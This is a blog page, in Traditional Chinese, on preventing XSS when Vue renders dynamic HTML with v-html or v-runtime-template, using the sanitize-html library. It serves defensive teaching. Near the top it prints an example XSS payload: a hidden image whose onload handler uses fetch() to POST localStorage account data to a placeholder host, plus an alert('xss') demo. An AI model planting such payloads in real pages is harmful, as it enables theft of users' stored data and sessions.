@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Vue Dynamic HTML Prevent XSS | Joseph&#39;s Work Note</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="在開發系統中 有可能會需要使用到 CMS 系統或是動態抓取 CDN 的頁面 取得 使用者動態設定的樣板或是 Banner 這裡一般人可能不會特別想到就是 XSS Attack 我曾經遇過 真的有被駭客將靜態的 html 檔案裏面故意塞惡意程式碼，導致使用者看到錯誤畫面的狀況 (ex: 這些 html 可能被駭客塞一些 js or redirect 導到錯誤網站 讓使用者看到一些錯誤資訊) 可以參考">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vue Dynamic HTML Prevent XSS">
+<meta property="og:url" content="https://josephmtsai.github.io/2022/06/26/VueHTMLTemplate/index.html">
+<meta property="og:site_name" content="Joseph&#39;s Work Note">
+<meta property="og:description" content="在開發系統中 有可能會需要使用到 CMS 系統或是動態抓取 CDN 的頁面 取得 使用者動態設定的樣板或是 Banner 這裡一般人可能不會特別想到就是 XSS Attack 我曾經遇過 真的有被駭客將靜態的 html 檔案裏面故意塞惡意程式碼，導致使用者看到錯誤畫面的狀況 (ex: 這些 html 可能被駭客塞一些 js or redirect 導到錯誤網站 讓使用者看到一些錯誤資訊) 可以參考">
+<meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2022-06-26T15:39:36.000Z">
+<meta property="article:modified_time" content="2022-06-26T17:39:37.222Z">
+<meta property="article:author" content="Joseph M Tsai">
+<meta property="article:tag" content="Vue">
+<meta property="article:tag" content="v-html">
+<meta property="article:tag" content="v-sanitize">
+<meta property="article:tag" content="v-runtime-template">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Joseph&#39;s Work Note</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜尋"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜尋"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://Josephmtsai.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-VueHTMLTemplate" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/06/26/VueHTMLTemplate/" class="article-date">
+  <time class="dt-published" datetime="2022-06-26T15:39:36.000Z" itemprop="datePublished">2022-06-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Vue Dynamic HTML Prevent XSS
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>在開發系統中 有可能會需要使用到 CMS 系統或是動態抓取 CDN 的頁面 取得</p>
+<p>使用者動態設定的樣板或是 Banner 這裡一般人可能不會特別想到就是 XSS Attack</p>
+<p>我曾經遇過 真的有被駭客將靜態的 html 檔案裏面故意塞惡意程式碼，導致使用者看到錯誤畫面的狀況</p>
+<p>(ex: 這些 html 可能被駭客塞一些 js or redirect 導到錯誤網站 讓使用者看到一些錯誤資訊)</p>
+<p>可以參考這篇<br><a target="_blank" rel="noopener" href="https://www.stackhawk.com/blog/vue-xss-guide-examples-and-prevention/#injecting-the-malicious-script">Vue XSS Attack Guide</a></p>
+<p>舉例來說我們可以透過隱藏的圖片發送 request 給 駭客的 Server 並且偷取到對應的 Cookie or Session ….</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;xxxx&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://test.api/&#x27;, &#123;method: &#x27;POST&#x27;, body: localStorage.getItem(&#x27;account&#x27;)&#125;)&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>回到主題來說<br>這裡列出兩種 vue 的 componet 可以動態 compile html ，這裡列出來用途以及差異<br>| Plugnin | Support | different | |<br>|——————–|——–|— ——–|—|<br>| v-html | 只支援純粹 HTML 無法支援 vue custom component | 無法防止 XSS attack |<br>| v-runtime-template | 支援 vue custom component &amp; variabe (需事先定義好) | 無法防止 XSS attack |</p>
+<p>以下是範例<br><a target="_blank" rel="noopener" href="https://codesandbox.io/s/dynamic-template-yvfx0n">DEMO</a></p>
+<p>我們可以看到我們在圖片 loading 的過程中插入 alert 如果沒有做任何阻擋 兩種方法都會跳 Alert</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;https://jnx.me/img/profile.jpg&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下來我們介紹今天的主角 Sanitize html</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apostrophecms/sanitize-html">sanitize html</a><br>在 Vue 3 裡面可以用<a target="_blank" rel="noopener" href="https://github.com/vannsl/vue-3-sanitize">vue-3-sanitize</a></p>
+<p>套件</p>
+<p>我們這裡可以透過此套件做比較主要的三件事情</p>
+<ol>
+<li>限制動態 HTML 的 TAG</li>
+</ol>
+<p>Default options</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allowedTags</span>: [</span><br><span class="line">  <span class="string">&quot;address&quot;</span>, <span class="string">&quot;article&quot;</span>, <span class="string">&quot;aside&quot;</span>, <span class="string">&quot;footer&quot;</span>, <span class="string">&quot;header&quot;</span>, <span class="string">&quot;h1&quot;</span>, <span class="string">&quot;h2&quot;</span>, <span class="string">&quot;h3&quot;</span>, <span class="string">&quot;h4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;h5&quot;</span>, <span class="string">&quot;h6&quot;</span>, <span class="string">&quot;hgroup&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;nav&quot;</span>, <span class="string">&quot;section&quot;</span>, <span class="string">&quot;blockquote&quot;</span>, <span class="string">&quot;dd&quot;</span>, <span class="string">&quot;div&quot;</span>,</span><br><span class="line">  <span class="string">&quot;dl&quot;</span>, <span class="string">&quot;dt&quot;</span>, <span class="string">&quot;figcaption&quot;</span>, <span class="string">&quot;figure&quot;</span>, <span class="string">&quot;hr&quot;</span>, <span class="string">&quot;li&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;ol&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;pre&quot;</span>,</span><br><span class="line">  <span class="string">&quot;ul&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;abbr&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;bdi&quot;</span>, <span class="string">&quot;bdo&quot;</span>, <span class="string">&quot;br&quot;</span>, <span class="string">&quot;cite&quot;</span>, <span class="string">&quot;code&quot;</span>, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;dfn&quot;</span>,</span><br><span class="line">  <span class="string">&quot;em&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;kbd&quot;</span>, <span class="string">&quot;mark&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;rb&quot;</span>, <span class="string">&quot;rp&quot;</span>, <span class="string">&quot;rt&quot;</span>, <span class="string">&quot;rtc&quot;</span>, <span class="string">&quot;ruby&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;samp&quot;</span>,</span><br><span class="line">  <span class="string">&quot;small&quot;</span>, <span class="string">&quot;span&quot;</span>, <span class="string">&quot;strong&quot;</span>, <span class="string">&quot;sub&quot;</span>, <span class="string">&quot;sup&quot;</span>, <span class="string">&quot;time&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;wbr&quot;</span>, <span class="string">&quot;caption&quot;</span>,</span><br><span class="line">  <span class="string">&quot;col&quot;</span>, <span class="string">&quot;colgroup&quot;</span>, <span class="string">&quot;table&quot;</span>, <span class="string">&quot;tbody&quot;</span>, <span class="string">&quot;td&quot;</span>, <span class="string">&quot;tfoot&quot;</span>, <span class="string">&quot;th&quot;</span>, <span class="string">&quot;thead&quot;</span>, <span class="string">&quot;tr&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">disallowedTagsMode</span>: <span class="string">&#x27;discard&#x27;</span>,</span><br><span class="line"><span class="attr">allowedAttributes</span>: &#123;</span><br><span class="line">  <span class="attr">a</span>: [ <span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;target&#x27;</span> ],</span><br><span class="line">  <span class="comment">// We don&#x27;t currently allow img itself by default, but</span></span><br><span class="line">  <span class="comment">// these attributes would make sense if we did.</span></span><br><span class="line">  <span class="attr">img</span>: [ <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;srcset&#x27;</span>, <span class="string">&#x27;alt&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;width&#x27;</span>, <span class="string">&#x27;height&#x27;</span>, <span class="string">&#x27;loading&#x27;</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// Lots of these won&#x27;t come up by default because we don&#x27;t allow them</span></span><br><span class="line"><span class="attr">selfClosing</span>: [ <span class="string">&#x27;img&#x27;</span>, <span class="string">&#x27;br&#x27;</span>, <span class="string">&#x27;hr&#x27;</span>, <span class="string">&#x27;area&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;basefont&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;meta&#x27;</span> ],</span><br><span class="line"><span class="comment">// URL schemes we permit</span></span><br><span class="line"><span class="attr">allowedSchemes</span>: [ <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;mailto&#x27;</span>, <span class="string">&#x27;tel&#x27;</span> ],</span><br><span class="line"><span class="attr">allowedSchemesByTag</span>: &#123;&#125;,</span><br><span class="line"><span class="attr">allowedSchemesAppliedToAttributes</span>: [ <span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;cite&#x27;</span> ],</span><br><span class="line"><span class="attr">allowProtocolRelative</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">enforceHtmlBoundary</span>: <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>限制 CSS &amp; Script &amp; iframe 語法</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clean = <span class="title function_">sanitizeHtml</span>(</span><br><span class="line">  <span class="string">&#x27;&lt;script src=&quot;https://www.safe.authorized.com/lib.js&quot;&gt;&lt;/script&gt;&#x27;</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">allowedTags</span>: [<span class="string">&#x27;script&#x27;</span>],</span><br><span class="line">    <span class="attr">allowedAttributes</span>: &#123;</span><br><span class="line">      <span class="attr">script</span>: [<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">allowedScriptDomains</span>: [<span class="string">&#x27;authorized.com&#x27;</span>],</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">onst clean = sanitizeHtml(dirty, &#123;</span><br><span class="line">        allowedTags: [<span class="string">&#x27;p&#x27;</span>],</span><br><span class="line">        allowedAttributes: &#123;</span><br><span class="line">          &#x27;<span class="selector-tag">p</span>&#x27;: [<span class="string">&quot;style&quot;</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">        allowedStyles: &#123;</span><br><span class="line">          &#x27;*&#x27;: &#123;</span><br><span class="line">            // Match HEX and RGB</span><br><span class="line">            &#x27;<span class="attribute">color</span>&#x27;: [/^#(<span class="number">0</span>x)?[<span class="number">0</span>-<span class="number">9</span>a-f]+$/i, /^rgb\(\s*(\d&#123;<span class="number">1</span>,<span class="number">3</span>&#125;)\s*,\s*(\d&#123;<span class="number">1</span>,<span class="number">3</span>&#125;)\s*,\s*(\d&#123;<span class="number">1</span>,<span class="number">3</span>&#125;)\s*\)$/],</span><br><span class="line">            &#x27;<span class="attribute">text-align</span>&#x27;: [/^left$/, /^right$/, /^center$/],</span><br><span class="line">            // Match any number with px, em, or %</span><br><span class="line">            <span class="string">&#x27;font-size&#x27;</span>: [/^\d+(?:px|em|%)$/]</span><br><span class="line">          &#125;,</span><br><span class="line">          &#x27;<span class="selector-tag">p</span>&#x27;: &#123;</span><br><span class="line">            &#x27;<span class="attribute">font-size</span>&#x27;: [/^\d+rem$/]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://josephmtsai.github.io/2022/06/26/VueHTMLTemplate/" data-id="cl4vlj18v0005emorbyr4b7um" data-title="Vue Dynamic HTML Prevent XSS" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/v-html/" rel="tag">v-html</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/v-runtime-template/" rel="tag">v-runtime-template</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/v-sanitize/" rel="tag">v-sanitize</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/06/08/VueApiErrorHandling/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Vue Api Error Handling</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">標籤</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Api/" rel="tag">Api</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/App-Debug/" rel="tag">App Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Axios/" rel="tag">Axios</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Debug/" rel="tag">Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Error/" rel="tag">Error</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Error-Handling/" rel="tag">Error Handling</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Intecept-Request/" rel="tag">Intecept Request</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Integration/" rel="tag">Integration</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Log/" rel="tag">Log</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pinia/" rel="tag">Pinia</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reactive/" rel="tag">Reactive</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Refs/" rel="tag">Refs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Source-Map/" rel="tag">Source Map</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tailwind-CSS/" rel="tag">Tailwind CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tailwind-CSS-Dark-Mode/" rel="tag">Tailwind CSS Dark Mode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UC-Browser/" rel="tag">UC Browser</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vite/" rel="tag">Vite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue-Life-Cycle/" rel="tag">Vue Life Cycle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue3/" rel="tag">Vue3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Debug/" rel="tag">Web Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/v-html/" rel="tag">v-html</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/v-runtime-template/" rel="tag">v-runtime-template</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/v-sanitize/" rel="tag">v-sanitize</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">標籤雲</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Api/" style="font-size: 10px;">Api</a> <a href="/tags/App-Debug/" style="font-size: 10px;">App Debug</a> <a href="/tags/Axios/" style="font-size: 10px;">Axios</a> <a href="/tags/Debug/" style="font-size: 10px;">Debug</a> <a href="/tags/Error/" style="font-size: 15px;">Error</a> <a href="/tags/Error-Handling/" style="font-size: 15px;">Error Handling</a> <a href="/tags/Intecept-Request/" style="font-size: 10px;">Intecept Request</a> <a href="/tags/Integration/" style="font-size: 10px;">Integration</a> <a href="/tags/Log/" style="font-size: 15px;">Log</a> <a href="/tags/Pinia/" style="font-size: 15px;">Pinia</a> <a href="/tags/Proxy/" style="font-size: 10px;">Proxy</a> <a href="/tags/Reactive/" style="font-size: 10px;">Reactive</a> <a href="/tags/Refs/" style="font-size: 10px;">Refs</a> <a href="/tags/Source-Map/" style="font-size: 10px;">Source Map</a> <a href="/tags/Tailwind-CSS/" style="font-size: 10px;">Tailwind CSS</a> <a href="/tags/Tailwind-CSS-Dark-Mode/" style="font-size: 10px;">Tailwind CSS Dark Mode</a> <a href="/tags/UC-Browser/" style="font-size: 10px;">UC Browser</a> <a href="/tags/Vite/" style="font-size: 10px;">Vite</a> <a href="/tags/Vue/" style="font-size: 10px;">Vue</a> <a href="/tags/Vue-Life-Cycle/" style="font-size: 10px;">Vue Life Cycle</a> <a href="/tags/Vue3/" style="font-size: 20px;">Vue3</a> <a href="/tags/Web-Debug/" style="font-size: 10px;">Web Debug</a> <a href="/tags/v-html/" style="font-size: 10px;">v-html</a> <a href="/tags/v-runtime-template/" style="font-size: 10px;">v-runtime-template</a> <a href="/tags/v-sanitize/" style="font-size: 10px;">v-sanitize</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">彙整</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/06/26/VueHTMLTemplate/">Vue Dynamic HTML Prevent XSS</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/08/VueApiErrorHandling/">Vue Api Error Handling</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/05/VueJsErrorHandling/">VueErrorHandling</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/28/VueMounted/">Vue Created Mounted example</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/28/PiniaWritingHint/">Pinia Writing Hint in Vue3</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/07/UCBrowserSupport/">UC Browser Support</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/05/InterceptInApp/">在手機上如何攔截到 http Request</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+        <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a></br>
+All website licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></br>
+      
+      &copy; 2022 Joseph M Tsai<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
